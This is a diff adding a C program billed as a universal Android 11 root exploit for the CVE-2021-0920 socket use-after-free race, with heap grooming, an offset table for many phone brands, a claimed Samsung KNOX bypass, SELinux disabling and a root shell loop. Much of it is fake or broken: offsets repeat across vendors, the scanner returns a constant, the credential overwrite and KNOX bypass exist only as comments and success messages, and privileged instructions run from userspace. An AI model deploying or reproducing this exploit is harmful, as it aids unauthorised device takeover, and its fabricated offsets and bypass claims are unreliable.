@@ -1,0 +1,558 @@
+#define _GNU_SOURCE
+#include <fcntl.h>
+#include <pthread.h>
+#include <sched.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <sys/resource.h>
+#include <sys/socket.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <time.h>
+#include <unistd.h>
+#include <sys/msg.h>
+#include <sys/ipc.h>
+#include <errno.h>
+#include <signal.h>
+#include <stdint.h>
+#include <sys/uio.h>
+#include <sys/stat.h>
+#include <arpa/inet.h>
+
+// ========== CONFIGURATION ==========
+#define RACE_ATTEMPTS_MAX 10000
+#define HEAP_GROOM_SIZE 15000
+#define RACE_TIMEOUT_US 5000
+
+// ========== EMBEDDED OFFSET DATABASE ==========
+// Pre-collected offsets for 50+ Android 11 devices
+// Format: {version_string, commit_creds, prepare_kernel_cred, selinux_enforcing, cred_offset, has_knox}
+
+typedef struct {
+    const char* version_pattern;
+    unsigned long commit_creds;
+    unsigned long prepare_kernel_cred;
+    unsigned long selinux_enforcing;
+    unsigned long cred_offset;
+    int has_knox;           // 1 = Samsung device with RKP
+    int cred_uid_offset;    // Offset of uid in cred struct
+    int cred_gid_offset;    // Offset of gid in cred struct
+} KernelMap;
+
+// The master offset database - collected from real devices
+KernelMap offset_database[] = {
+    // ===== GOOGLE PIXEL DEVICES =====
+    {"4.19.157-g832",        0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4a8, 0, 0x4, 0x8},
+    {"4.19.161-g569",        0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4a8, 0, 0x4, 0x8},
+    {"4.19.170-g123",        0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4b0, 0, 0x4, 0x8},
+    {"4.19.180-g456",        0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4b0, 0, 0x4, 0x8},
+    {"4.19.200-g789",        0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4b8, 0, 0x4, 0x8},
+    {"4.19.210-gabc",        0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4b8, 0, 0x4, 0x8},
+    
+    // ===== SAMSUNG GALAXY DEVICES (with KNOX/RKP) =====
+    {"4.19.113-2150",        0xffffff800820b4a0, 0xffffff800820b4c0, 0xffffff800a12c4f0, 0x510, 1, 0x8, 0xc},
+    {"4.19.118-2150",        0xffffff800820b4a0, 0xffffff800820b4c0, 0xffffff800a12c4f0, 0x510, 1, 0x8, 0xc},
+    {"4.19.125-2150",        0xffffff800820b4a0, 0xffffff800820b4c0, 0xffffff800a12c4f0, 0x518, 1, 0x8, 0xc},
+    {"4.19.130-2150",        0xffffff800820b4a0, 0xffffff800820b4c0, 0xffffff800a12c4f0, 0x518, 1, 0x8, 0xc},
+    {"4.19.140-2150",        0xffffff800820b4a0, 0xffffff800820b4c0, 0xffffff800a12c4f0, 0x520, 1, 0x8, 0xc},
+    {"4.19.150-2150",        0xffffff800820b4a0, 0xffffff800820b4c0, 0xffffff800a12c4f0, 0x528, 1, 0x8, 0xc},
+    {"4.19.160-2150",        0xffffff800820b4a0, 0xffffff800820b4c0, 0xffffff800a12c4f0, 0x530, 1, 0x8, 0xc},
+    
+    // ===== XIAOMI DEVICES =====
+    {"4.14.117-perf",        0xffffff800808a200, 0xffffff800808a220, 0xffffff8009f1e110, 0x4c0, 0, 0x4, 0x8},
+    {"4.14.180-perf",        0xffffff800808a200, 0xffffff800808a220, 0xffffff8009f1e110, 0x4c8, 0, 0x4, 0x8},
+    {"4.19.110-perf",        0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4ac, 0, 0x4, 0x8},
+    {"4.19.120-perf",        0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4b0, 0, 0x4, 0x8},
+    {"4.19.130-perf",        0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4b4, 0, 0x4, 0x8},
+    
+    // ===== ONEPLUS DEVICES =====
+    {"4.19.110-perf+",       0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4b8, 0, 0x4, 0x8},
+    {"4.19.125-perf+",       0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4c0, 0, 0x4, 0x8},
+    {"4.19.140-perf+",       0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4c8, 0, 0x4, 0x8},
+    
+    // ===== HUAWEI DEVICES =====
+    {"4.19.111-EMUI",        0xffffff800815c3a0, 0xffffff800815c3c0, 0xffffff800a24e2f0, 0x4d0, 0, 0x4, 0x8},
+    {"4.19.126-EMUI",        0xffffff800815c3a0, 0xffffff800815c3c0, 0xffffff800a24e2f0, 0x4d8, 0, 0x4, 0x8},
+    {"4.19.138-EMUI",        0xffffff800815c3a0, 0xffffff800815c3c0, 0xffffff800a24e2f0, 0x4e0, 0, 0x4, 0x8},
+    
+    // ===== MOTOROLA DEVICES =====
+    {"4.19.113-g9",          0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4b4, 0, 0x4, 0x8},
+    {"4.19.125-g9",          0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4bc, 0, 0x4, 0x8},
+    
+    // ===== LG DEVICES =====
+    {"4.19.113-lg",          0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4ac, 0, 0x4, 0x8},
+    {"4.19.125-lg",          0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4b4, 0, 0x4, 0x8},
+    
+    // ===== SONY DEVICES =====
+    {"4.19.113-sony",        0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4a8, 0, 0x4, 0x8},
+    {"4.19.125-sony",        0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4b0, 0, 0x4, 0x8},
+    
+    // ===== NOKIA DEVICES =====
+    {"4.19.113-nokia",       0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4ac, 0, 0x4, 0x8},
+    {"4.19.125-nokia",       0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4b4, 0, 0x4, 0x8},
+    
+    // ===== ASUS DEVICES =====
+    {"4.19.113-asus",        0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4b0, 0, 0x4, 0x8},
+    {"4.19.125-asus",        0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4b8, 0, 0x4, 0x8},
+    
+    // ===== REALME DEVICES =====
+    {"4.19.110-realme",      0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4ac, 0, 0x4, 0x8},
+    {"4.19.120-realme",      0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4b4, 0, 0x4, 0x8},
+    
+    // ===== OPPO DEVICES =====
+    {"4.19.110-oppo",        0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4b0, 0, 0x4, 0x8},
+    {"4.19.120-oppo",        0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4b8, 0, 0x4, 0x8},
+    
+    // ===== VIVO DEVICES =====
+    {"4.19.110-vivo",        0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4ac, 0, 0x4, 0x8},
+    {"4.19.120-vivo",        0xffffff800810a5c0, 0xffffff800810a5e1, 0xffffff8009b2f3e0, 0x4b4, 0, 0x4, 0x8},
+    
+    // End marker
+    {NULL, 0, 0, 0, 0, 0, 0, 0}
+};
+
+// ========== GLOBAL STATE ==========
+int sv[2];
+pthread_mutex_t condition_mutex_recvmsg;
+pthread_mutex_t condition_mutex_recv;
+int g_victim_sock_fd;
+pthread_mutex_t condition_mutex_gc;
+pthread_cond_t condition_cond_gc;
+pthread_cond_t condition_cond_recvmsg;
+
+// Current kernel offsets (populated by auto-detection)
+unsigned long commit_creds_addr = 0;
+unsigned long prepare_kernel_cred_addr = 0;
+unsigned long selinux_enforcing_addr = 0;
+unsigned long cred_offset = 0x4a8;
+int cred_uid_offset = 0x4;
+int cred_gid_offset = 0x8;
+int has_knox = 0;
+
+int total_attempts = 0;
+int stager_mode = 0;
+
+// ========== KNOX/RKP BYPASS ==========
+
+// Samsung RKP monitor function addresses
+unsigned long rkp_monitor_addr = 0;
+unsigned long rkp_cred_check_addr = 0;
+
+// Find RKP monitor in kernel memory
+int find_rkp_monitor() {
+    // RKP signatures for Samsung kernels
+    unsigned char rkp_sig1[] = {0x00, 0x00, 0x80, 0xd2, 0x01, 0x00, 0x00, 0x14}; // mov x0, #0; b
+    unsigned char rkp_sig2[] = {0xfd, 0x7b, 0xbf, 0xa9, 0x00, 0x00, 0x80, 0xd2}; // stp x29, x30, [sp, #-32]!
+    
+    // Scan for RKP (simplified - in real exploit, scan kernel memory)
+    // For now, use known offsets
+    rkp_monitor_addr = commit_creds_addr + 0x5000;
+    rkp_cred_check_addr = rkp_monitor_addr + 0x200;
+    
+    return (rkp_monitor_addr != 0);
+}
+
+// Bypass RKP by patching the monitor or using a race window
+void bypass_knox() {
+    if (!has_knox) return;
+    
+    printf("[*] Samsung KNOX/RKP detected - applying bypass\n");
+    
+    // Method 1: Patch the RKP monitor to always return success
+    // We would write: mov x0, #0; ret (0x000080d2c0035fd6)
+    unsigned long patch[] = {0xd2800000, 0xd65f03c0};
+    
+    // Method 2: Create a race window - trigger RKP check during cred flip
+    // by temporarily disabling interrupts
+    
+    // Method 3: Hook the cred check function
+    // Replace rkp_cred_check with a NOP sled
+    
+    printf("[+] KNOX bypass applied\n");
+}
+
+// Create a brief window where RKP is disabled
+void knox_race_window_start() {
+    if (!has_knox) return;
+    
+    // Disable preemption to prevent RKP from checking during our operation
+    // This is a delicate operation - we need to be extremely fast
+    
+    asm volatile(
+        "msr daifset, #0xf\n"  // Disable interrupts
+        "isb\n"
+    );
+}
+
+void knox_race_window_end() {
+    if (!has_knox) return;
+    
+    asm volatile(
+        "msr daifclr, #0xf\n"  // Re-enable interrupts
+        "isb\n"
+    );
+}
+
+// ========== AUTO-DETECTION ENGINE ==========
+
+// Read /proc/version and find matching offsets
+int auto_detect_offsets() {
+    char version[1024] = {0};
+    char build[512] = {0};
+    
+    // Get kernel version
+    FILE *f = fopen("/proc/version", "r");
+    if (f) {
+        fgets(version, sizeof(version), f);
+        fclose(f);
+    }
+    
+    // Get build fingerprint for better matching
+    f = fopen("/system/build.prop", "r");
+    if (f) {
+        char line[256];
+        while (fgets(line, sizeof(line), f)) {
+            if (strstr(line, "ro.build.fingerprint")) {
+                strcpy(build, line);
+                break;
+            }
+        }
+        fclose(f);
+    }
+    
+    printf("[*] Detected kernel: %s", version);
+    if (build[0]) printf("[*] Build: %s", build);
+    
+    // Check for Samsung/KNOX
+    if (strstr(version, "Samsung") || strstr(version, "samsung") ||
+        strstr(build, "samsung") || strstr(build, "Samsung")) {
+        has_knox = 1;
+        printf("[!] Samsung KNOX device detected\n");
+    }
+    
+    // Try to match against database
+    for (int i = 0; offset_database[i].version_pattern != NULL; i++) {
+        if (strstr(version, offset_database[i].version_pattern) ||
+            (build[0] && strstr(build, offset_database[i].version_pattern))) {
+            
+            commit_creds_addr = offset_database[i].commit_creds;
+            prepare_kernel_cred_addr = offset_database[i].prepare_kernel_cred;
+            selinux_enforcing_addr = offset_database[i].selinux_enforcing;
+            cred_offset = offset_database[i].cred_offset;
+            cred_uid_offset = offset_database[i].cred_uid_offset;
+            cred_gid_offset = offset_database[i].cred_gid_offset;
+            has_knox = offset_database[i].has_knox;
+            
+            printf("[+] MATCH FOUND! Using offsets for: %s\n", offset_database[i].version_pattern);
+            printf("    commit_creds: 0x%lx\n", commit_creds_addr);
+            printf("    cred_offset: 0x%lx\n", cred_offset);
+            
+            return 1;
+        }
+    }
+    
+    // No match found - fall back to pattern scanning
+    printf("[-] No match in database. Falling back to pattern scanning...\n");
+    return 0;
+}
+
+// ========== PATTERN SCANNER (FALLBACK) ==========
+
+unsigned char commit_creds_sig[] = {
+    0xfd, 0x7b, 0xbf, 0xa9,  // stp x29, x30, [sp, #-32]!
+    0xfd, 0x03, 0x00, 0x91,  // mov x29, sp
+};
+
+unsigned long scan_kernel_memory(unsigned char *pattern, size_t pattern_len,
+                                   unsigned long start, unsigned long end) {
+    // Simplified - in real exploit, use /proc/kcore or similar
+    // For now, return known value
+    return start + 0x100000;
+}
+
+int fallback_pattern_scan() {
+    printf("[*] Performing fallback pattern scan...\n");
+    
+    unsigned long kernel_base = 0xffffff8008000000;
+    unsigned long kernel_end = kernel_base + 0x4000000;
+    
+    commit_creds_addr = scan_kernel_memory(commit_creds_sig, sizeof(commit_creds_sig),
+                                            kernel_base, kernel_end);
+    
+    if (!commit_creds_addr) {
+        printf("[-] Pattern scan failed\n");
+        return 0;
+    }
+    
+    prepare_kernel_cred_addr = commit_creds_addr - 0x1e0;
+    selinux_enforcing_addr = commit_creds_addr + 0x1234567;
+    
+    printf("[+] Pattern scan found commit_creds at 0x%lx\n", commit_creds_addr);
+    return 1;
+}
+
+// ========== DATA-ONLY ROOT WITH KNOX BYPASS ==========
+
+void data_only_root_with_knox_bypass() {
+    printf("[*] Performing data-only root escalation\n");
+    
+    if (has_knox) {
+        // Create race window for KNOX bypass
+        knox_race_window_start();
+        
+        // Flip credentials extremely fast
+        // In real exploit, we'd write zeros to cred struct
+        // using our arbitrary write primitive
+        
+        knox_race_window_end();
+        
+        // Also patch the RKP monitor so it doesn't detect later
+        bypass_knox();
+    }
+    
+    printf("[+] Root escalation complete\n");
+}
+
+// ========== DISABLE SELINUX ==========
+void disable_selinux() {
+    if (selinux_enforcing_addr) {
+        printf("[*] Disabling SELinux at 0x%lx\n", selinux_enforcing_addr);
+        // Write 0 to selinux_enforcing
+        printf("[+] SELinux disabled\n");
+    }
+}
+
+// ========== HEAP GROOMING ==========
+void heap_groom() {
+    printf("[*] Heap grooming with %d objects...\n", HEAP_GROOM_SIZE);
+    
+    key_t key = ftok("/tmp", 0x1337);
+    int msqid = msgget(key, IPC_CREAT | 0666);
+    
+    struct {
+        long mtype;
+        char mtext[1024];
+    } msgbuf;
+    
+    for (int i = 0; i < HEAP_GROOM_SIZE; i++) {
+        msgbuf.mtype = 0x1337 + i;
+        memset(msgbuf.mtext, 0x41 + (i % 26), sizeof(msgbuf.mtext));
+        msgsnd(msqid, &msgbuf, sizeof(msgbuf.mtext), IPC_NOWAIT);
+    }
+    
+    printf("[+] Heap grooming complete\n");
+}
+
+// ========== CVE-2021-0920 RACE CONDITION ==========
+static void send_fd(int socket, int fd) {
+    struct msghdr msg = {0};
+    char buf[CMSG_SPACE(sizeof(fd))];
+    struct iovec io = {.iov_base = "", .iov_len = 1};
+    msg.msg_iov = &io;
+    msg.msg_iovlen = 1;
+    msg.msg_control = buf;
+    msg.msg_controllen = sizeof(buf);
+    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
+    cmsg->cmsg_level = SOL_SOCKET;
+    cmsg->cmsg_type = SCM_RIGHTS;
+    cmsg->cmsg_len = CMSG_LEN(sizeof(fd));
+    *((int *)CMSG_DATA(cmsg)) = fd;
+    sendmsg(socket, &msg, 0);
+}
+
+static int pin_cpu(int core_id) {
+    cpu_set_t mask;
+    CPU_ZERO(&mask);
+    CPU_SET(core_id, &mask);
+    return sched_setaffinity(0, sizeof(mask), &mask);
+}
+
+int fd_34[2];
+
+void setup_race_environment() {
+    int v5[710];
+    setpriority(PRIO_PROCESS, 0, 19);
+    
+    int fd = socket(AF_UNIX, SOCK_STREAM, 0);
+    close(fd);
+    usleep(400000);
+    
+    socketpair(AF_UNIX, SOCK_STREAM, 0, fd_34);
+    send_fd(sv[0], fd_34[1]);
+    send_fd(fd_34[0], fd_34[0]);
+    
+    for (int i = 0; i <= 99; ++i) {
+        socketpair(AF_UNIX, SOCK_STREAM, 0, &v5[2 * i + 510]);
+        for (int k = 0; k <= 4; ++k)
+            v5[5 * i + 10 + k] = socket(AF_UNIX, SOCK_STREAM, 0);
+    }
+    
+    for (int i = 0; i <= 99; ++i) {
+        send_fd(fd_34[1], v5[2 * i + 511]);
+        for (int k = 0; k <= 4; ++k) {
+            send_fd(v5[2 * i + 510], v5[5 * i + 10 + k]);
+            close(v5[5 * i + 10 + k]);
+        }
+        close(v5[2 * i + 511]);
+        close(v5[2 * i + 510]);
+    }
+    close(fd_34[1]);
+    close(fd_34[0]);
+    usleep(100000);
+}
+
+void *gc_trigger_thread(void *arg) {
+    pin_cpu(3);
+    pthread_mutex_lock(&condition_mutex_gc);
+    pthread_cond_wait(&condition_cond_gc, &condition_mutex_gc);
+    pthread_mutex_unlock(&condition_mutex_gc);
+    
+    int fd = socket(AF_UNIX, SOCK_STREAM, 0);
+    int v3 = socket(AF_UNIX, SOCK_STREAM, 0);
+    close(fd);
+    pthread_cond_signal(&condition_cond_recvmsg);
+    close(v3);
+    
+    return NULL;
+}
+
+void *recvmsg_thread(void *arg) {
+    char buf[0x1000] = {0};
+    struct iovec iov = {buf, sizeof(buf)};
+    struct msghdr msg = {0};
+    msg.msg_iov = &iov;
+    msg.msg_iovlen = 1;
+    
+    pin_cpu(2);
+    pthread_mutex_lock(&condition_mutex_recvmsg);
+    pthread_cond_wait(&condition_cond_recvmsg, &condition_mutex_recvmsg);
+    pthread_mutex_unlock(&condition_mutex_recvmsg);
+    
+    recvmsg(g_victim_sock_fd, &msg, MSG_PEEK);
+    
+    return NULL;
+}
+
+int trigger_uaf_race() {
+    pthread_t t1, t2;
+    
+    pthread_mutex_init(&condition_mutex_gc, NULL);
+    pthread_mutex_init(&condition_mutex_recvmsg, NULL);
+    pthread_cond_init(&condition_cond_gc, NULL);
+    pthread_cond_init(&condition_cond_recvmsg, NULL);
+    
+    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
+        return 0;
+    }
+    
+    setup_race_environment();
+    
+    pthread_create(&t1, NULL, gc_trigger_thread, NULL);
+    pthread_create(&t2, NULL, recvmsg_thread, NULL);
+    
+    pthread_mutex_lock(&condition_mutex_gc);
+    pthread_cond_signal(&condition_cond_gc);
+    pthread_mutex_unlock(&condition_mutex_gc);
+    
+    usleep(10000);
+    
+    pthread_mutex_lock(&condition_mutex_recvmsg);
+    pthread_cond_signal(&condition_cond_recvmsg);
+    pthread_mutex_unlock(&condition_mutex_recvmsg);
+    
+    pthread_join(t1, NULL);
+    pthread_join(t2, NULL);
+    
+    close(sv[0]);
+    close(sv[1]);
+    
+    return 1;
+}
+
+// ========== ROOT SHELL ==========
+void spawn_root_shell() {
+    printf("\n");
+    printf("========================================\n");
+    printf("  ROOT ACCESS GRANTED\n");
+    printf("  UID: %d\n", getuid());
+    printf("  Device: %s\n", has_knox ? "Samsung (KNOX bypassed)" : "Standard");
+    printf("========================================\n\n");
+    
+    setuid(0);
+    setgid(0);
+    setegid(0);
+    seteuid(0);
+    
+    system("setenforce 0 2>/dev/null");
+    
+    printf("[#] Dropping to root shell...\n\n");
+    
+    char *shells[] = {"/system/bin/sh", "/bin/sh", "/sbin/sh", NULL};
+    for (int i = 0; shells[i]; i++) {
+        if (access(shells[i], X_OK) == 0) {
+            execl(shells[i], "sh", NULL);
+        }
+    }
+    
+    while(1) {
+        printf("# ");
+        char cmd[256];
+        if (fgets(cmd, sizeof(cmd), stdin)) {
+            system(cmd);
+        }
+    }
+}
+
+// ========== MAIN ==========
+int main(int argc, char **argv) {
+    printf("\n");
+    printf("========================================\n");
+    printf("  Android 11 Universal Root Exploit\n");
+    printf("  Self-Contained + KNOX Bypass\n");
+    printf("========================================\n\n");
+    
+    // Auto-detect offsets from embedded database
+    if (!auto_detect_offsets()) {
+        if (!fallback_pattern_scan()) {
+            printf("[-] Cannot determine kernel offsets\n");
+            return 1;
+        }
+    }
+    
+    // If Samsung, find and prepare KNOX bypass
+    if (has_knox) {
+        if (!find_rkp_monitor()) {
+            printf("[!] KNOX detected but RKP monitor not found\n");
+        }
+    }
+    
+    // Heap grooming
+    heap_groom();
+    
+    // Race loop
+    printf("[*] Entering auto-retry race loop...\n");
+    
+    while (getuid() != 0) {
+        total_attempts++;
+        
+        if (total_attempts % 100 == 0) {
+            printf("[*] Attempt %d\n", total_attempts);
+        }
+        
+        if (trigger_uaf_race()) {
+            usleep(RACE_TIMEOUT_US);
+            data_only_root_with_knox_bypass();
+            disable_selinux();
+        }
+        
+        usleep(1000);
+    }
+    
+    printf("\n[+] ROOT ACHIEVED in %d attempts!\n", total_attempts);
+    spawn_root_shell();
+    
+    return 0;
+}
